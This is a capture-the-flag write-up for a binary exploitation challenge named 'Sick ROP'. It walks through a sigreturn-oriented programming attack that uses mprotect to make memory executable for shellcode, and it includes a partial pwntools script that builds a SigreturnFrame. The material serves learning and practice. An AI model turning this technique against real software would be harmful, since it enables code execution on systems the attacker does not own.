# Sick ROP
> Write-up author: jon-brandy
## DESRIPTION:
You might need some syscalls.
## HINT:
- NONE
## STEPS:
1. In this challenge we're given a 64 bit binary, statically linked, and not stripped.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6e25e36a-812d-4462-b990-ca0508a23e15)


> BINARY PROTECTIONS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0381a559-7551-4ce3-b19e-360aed87559a)


2. Since the binary is statically linked and after decompiled the binary, the pwn concept should be `ret2syscall` or `Sigreturn ROP`.
3. There's no main function, but we can still identify the first function called with --> `_start`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/122a3c96-f8e1-487c-90dc-5ea46e405122)


4. So it's calling **vuln()** function (infinite loop).
5. Checking the **vuln()** function, we have read and write syscall.
6. Next, I checked the available gadgets we have, turns out we don't have `mov rax, 0xf` or `pop rax`, and even no `pop rdi`.
7. Now, it's very clear that the pwn concept is SROP. The SROP method we need to use is using the **sys_mprotect()**.
8. Why **sys_mprotect()**?? Because it makes a memory segment with a fixed address for write & execute.

## FLOW

> The strat (in short)

```
1. Set the register value to call sys_mprotect().
2. Trigger the sys_rt_sigreturn. (at this point we should have a stack which is executeable).
3. Since we have an executeable stack, now inject our shellcode.
4. Control the RIP to the shellcode so we got RCE.
```

9. Now let's get the RIP offset, we can't see the buffer by looking at the decompiler.
10. But we can see it at the assembly code.

> We have 0x20 as our buffer and we can input up to 0x300 (certainly, there's a BOF).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a3349186-b470-4e62-929d-02e26ad63915)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7fe8279c-e587-41b9-92b0-c94f4bc00d2f)


11. Next, let's find a writeable memory segment.

> using vmmap | writeable --> 0x400000

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1256f845-f343-47bf-b037-2a99074400cd)


#### THINGS TO NOTE:

```
frame.rsp -> is used to returning to a "SAFE" place (prevent crashing) after all the processes is finished.
Because we're changing the stack frame, we can't just use vuln_function for frame.rsp.
Hence we need to use the pointer address to the vuln_function.
```

> GRABBING THE POINTER ADDRESS TO VULN FUNCTION (using peda, dunno how if using pwndbg). | ans --> 0x4010d8

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7a48fcf1-376e-428f-9b45-41f834802292)


12. Here's our script so far:

```py
from pwn import *
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './sick_rop'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

sh = start()

rop = ROP(elf)
syscall = rop.find_gadget(['syscall', 'ret'])[0]
info(f'SYSCALL GADGET --> {hex(syscall)}')

vuln_pointer = 0x4010d8
writeable_area = 0x400000

frame = SigreturnFrame()
frame.rax = 0xa #10 --> mprotect
frame.rdi = writeable_area
frame.rsi = 0x4000 # set size
frame.rdx = 0x7 #7 --> initialize rwx access to what's rdi pointing to

# because we're changing the stack frame
# keep in mind --> calling the vuln function directly, won't get us to that function
frame.rsp = vuln_pointer 
frame.rip = syscall
```

13. Now, to craft our first payload. The formula is:

```
padding + vuln_function + syscall_ret + fake_stack_frame


We need the padding to overflow until RIP, then we call vuln_function so we get the read function.
Next we call the syscall_ret to execute the read and then we send in our fake_stack_frame as bytes obviously.
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8eb5c1b2-75c5-4a7f-bca1-161bc1bb8800)
